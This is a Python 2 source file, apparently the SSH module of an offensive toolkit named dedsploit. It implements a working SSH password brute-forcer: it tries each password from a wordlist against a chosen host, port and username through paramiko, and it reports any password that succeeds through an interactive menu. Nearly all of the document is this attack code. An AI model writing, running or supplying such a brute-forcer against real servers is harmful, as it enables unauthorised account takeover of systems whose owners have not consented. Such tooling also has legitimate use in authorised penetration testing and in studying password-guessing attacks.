'''

SSH Module for dedsploit. Attack vectors include:
1. bruteforce

'''

import sys

# Incorporate mainLib for module-wide variables (i.e, colors)
sys.path.append('dedsploit/')
from mainLib import *


#############################
# SSH_Connect - method for creating objects, and returning codes to see if authentication is success/Failed
#############################
def ssh_connect(address, username, password, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        ssh.connect(address, port=int(port), username=username, password=password) # Try to connect to given address
    except paramiko.AuthenticationException:
        code = 1        # Incorrect!
    except socket.error, e:
        print R + "[!] Error: Connection Failed. [!]" + W
        code = 2 # Error!

    ssh.close()
    return code # code = 0 : Success!


############
# Main bruteforce module for SSH - execute ssh_connect() method, and handles code to print proper output
############
def sshBruteforce(address, username, wordlist, port):
    wordlist = open(wordlist, 'r')

    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(address, username, password, port)
            if response == 0:
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            elif response == 1:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            elif response == 2:
                print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                exit()
        except Exception, e:
            print e
            pass
        wordlist.close()

#######################
# SSH Module for dedsploit!
#######################
def ssh():
    print LISTMSG
    print ssh_menu
    while True:
        try:
            ssh_options = raw_input(LP + "[ssh] >> " + W )
            if ssh_options == "list": # print help again
                print ssh_menu
            elif ssh_options == "clear":
                os.system("clear")
            elif ssh_options == "exit": # go back to main menu
                break
            elif ssh_options == "bruteforce": # start ssh bruteforce menu
                print sshbrute_menu
                while True: # loop until exit. Even after method is called.
                    pre, sshbrute_options = raw_input(LP + "[ssh] bruteforce >> " + W ).split()
                    if pre == "target":
                        ssh_target = sshbrute_options
                        print "Target => ", ssh_target
                        continue
                    elif pre == "port":
                        ssh_port = sshbrute_options
                        print "Port => ", ssh_port
                        continue
                    elif pre == "username":
                        ssh_username = sshbrute_options
                        print "Username => ", ssh_username
                        continue
                    elif pre == "wordlist":
                        wordlist = sshbrute_options
                        print "Wordlist => ", wordlist
                        continue
                    elif pre == "start":
                        sshBruteforce(ssh_target, ssh_username, wordlist, ssh_port)
        except ValueError:
            print WARNING
            continue
        except KeyboardInterrupt: # Ctrl + C to go back to main menu
            break
